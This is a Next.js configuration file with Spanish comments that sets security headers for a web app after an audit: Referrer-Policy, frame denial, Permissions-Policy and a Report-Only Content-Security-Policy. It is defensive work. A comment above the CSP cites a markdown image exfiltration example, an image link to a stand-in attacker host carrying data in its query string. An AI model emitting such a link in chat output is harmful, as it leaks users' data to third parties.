import type { NextConfig } from 'next'

/**
 * Headers de seguridad (`SEC-11`, auditoría del 2026-08-18).
 *
 * **Van acá y no en `proxy.ts`**, aunque `SEC-11` naciera pegado a `SEC-01`: en la
 * cadena de Next los `headers()` de la config corren **antes** que el Proxy, los
 * aplica la capa de routing y no gastan una invocación de función. Solo un CSP con
 * nonce por request obligaría a moverlos al Proxy — y el nonce no es lo que este
 * hallazgo pide.
 *
 * ⚠️ **HSTS no está en esta lista a propósito**: Vercel ya emite
 * `Strict-Transport-Security: max-age=63072000` por su cuenta en el dominio propio
 * (verificado contra producción el 2026-08-18). Declararlo acá sería duplicarlo.
 */
const esProduccion = process.env.NODE_ENV === 'production'

/**
 * Las fotos de dueño se sirven desde R2 directo (`lib/storage/r2.ts`, egress gratis),
 * así que el host sale de la misma variable que arma esas URLs y no de una constante
 * pegada acá: dev y producción usan buckets distintos (`DEPLOY` F1).
 */
const HOST_R2 = process.env.R2_PUBLIC_URL?.trim().replace(/\/+$/, '')

/**
 * De dónde carga cosas la app, hoy. Cada entrada tiene un dueño concreto:
 * - `tiles.openfreemap.org` — el mapa (`MAPA`, decisión 21). MapLibre además levanta
 *   sus Web Workers desde un `blob:`, que es lo que obliga al `worker-src`.
 * - `*.googleusercontent.com` — la foto de la ficha. La URI efímera la resuelve el
 *   server (`fetchFotoUri`, para que la API key no llegue al browser) pero los bytes
 *   los baja el browser de Google.
 * - `sdk.mercadopago.com` y los iframes de MP — el checkout. **Hoy está apagado**
 *   (`NEXT_PUBLIC_MP_PUBLIC_KEY` sin setear, `DEPLOY` F3), y va igual: descubrir que
 *   el CSP rompe el cobro el día que se enciende el cobro es el peor momento posible.
 * - `va.vercel-scripts.com` — el Web Analytics de Vercel (`<Analytics />` en el
 *   layout, prendido desde el panel el 2026-08-14). **Este no salió de leer el código:
 *   lo encontró el `Report-Only` en vivo**, que es exactamente para lo que está. El
 *   beacon que manda después va a `/_vercel/insights/*`, o sea al propio origen.
 */
const CSP = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  // Duplica a `X-Frame-Options` a propósito: es el que entienden los browsers nuevos.
  "frame-ancestors 'none'",
  // Acota el open redirect de `SEC-04` por segunda vía: un form no puede postear afuera.
  "form-action 'self'",
  // `unsafe-inline`: Next inyecta el payload de RSC en scripts inline y sin nonce no
  // hay forma de firmarlos. `unsafe-eval` es **solo de dev** (lo pide el HMR).
  `script-src 'self' 'unsafe-inline' ${esProduccion ? '' : "'unsafe-eval' "}blob: https://sdk.mercadopago.com https://va.vercel-scripts.com`,
  "worker-src 'self' blob:",
  "style-src 'self' 'unsafe-inline'",
  ["img-src 'self' data: blob: https://tiles.openfreemap.org https://*.googleusercontent.com", HOST_R2]
    .filter(Boolean)
    .join(' '),
  "font-src 'self' data:",
  "connect-src 'self' https://tiles.openfreemap.org",
  'frame-src https://*.mercadopago.com https://*.mercadolibre.com',
  "manifest-src 'self'",
].join('; ')

const HEADERS = [
  /**
   * El de mejor retorno del hallazgo, y una línea. Hay **dos superficies con token en
   * la URL** —`/votacion/[token]` y el `?token=` de `/restablecer`— que linkean a
   * dominios externos: sin esto el `Referer` les manda el path entero, o sea el token
   * de reset. Con `strict-origin-when-cross-origin` el tercero recibe el origen pelado.
   */
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  /**
   * ⚠️ **Hoy el clickjacking NO funciona** y conviene saberlo antes de creer que esto
   * tapa un agujero abierto: la cookie de sesión es `sameSite: lax` y las cookies Lax
   * no viajan en la carga de un iframe cross-site, así que el iframe renderiza
   * deslogueado. Va igual, por el día que alguien toque ese `sameSite`.
   */
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  /**
   * Solo se niega lo que la app no usa. **No se enumera lo que sí** —`geolocation` es
   * el modo GPS de la búsqueda, `clipboard-write` es "copiar el link" de una votación—
   * porque lo que no se nombra conserva su default. `payment` queda **afuera a
   * propósito**: el checkout de MP se enciende en `DEPLOY` F3 y no está medido si su
   * iframe usa la Payment Request API; negarlo antes de saberlo es romper un flujo de
   * cobro en silencio.
   */
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), browsing-topics=()' },
  /**
   * ⚠️ **`Report-Only`, y sigue así hasta que se verifique con tráfico real.** El CSP
   * es el único de los cinco que mueve la aguja —habría contenido a `SEC-04` y corta la
   * exfiltración por markdown del chat (`![](https://malo/?d=…)` renderiza un `<img>`
   * que carga solo)— y también el único que puede romper una pantalla entera.
   *
   * **Limitación honesta**: sin un endpoint que junte los reportes, esto solo escribe en
   * la consola del browser. O sea que "esperar tráfico real" no acumula evidencia por sí
   * solo — la evidencia sale de recorrer las pantallas con la consola abierta, o de
   * sumar un colector. Ver `docs/qa/SEGURIDAD.md` § `SEC-11`.
   */
  { key: 'Content-Security-Policy-Report-Only', value: CSP },
]

const nextConfig: NextConfig = {
  // El dev se expone por un túnel ngrok fijo (https://adondesalimos.ngrok.app).
  // Sin esto, Next bloquea los recursos de `/_next/*` cuando llegan desde ese
  // host y la app cargada por el túnel no monta el JS. Solo afecta a `next dev`.
  allowedDevOrigins: ['adondesalimos.ngrok.app'],

  async headers() {
    return [{ source: '/:path*', headers: HEADERS }]
  },
}

export default nextConfig
